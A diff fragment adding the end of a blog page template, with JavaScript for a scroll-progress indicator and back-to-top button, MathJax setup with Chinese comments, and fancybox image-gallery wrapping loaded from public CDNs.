+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
